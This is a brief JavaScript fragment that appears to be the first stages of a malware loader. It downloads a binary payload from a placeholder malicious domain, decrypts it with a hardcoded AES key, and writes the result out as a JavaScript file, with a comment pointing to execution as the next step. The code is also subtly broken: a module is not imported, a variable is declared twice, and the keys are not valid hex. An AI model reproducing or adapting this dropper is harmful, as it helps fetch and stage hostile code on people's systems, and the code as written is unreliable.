const fs = require('fs');
https.get('https://malicious-domain.com/payload.bin', (res) => {
  const file = fs.createWriteStream('payload.bin');
  res.pipe(file);
  file.on('finish', () => {
    file.close();
    // Next stage: decryption and execution
  });
});

const { execSync } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');
const encrypted = fs.readFileSync('payload.bin');
const key = Buffer.from('hardcodedkey', 'hex');
const iv = Buffer.from('hardcodediv', 'hex');
const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
let decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);
fs.writeFileSync('payload_decrypted.js', decrypted);
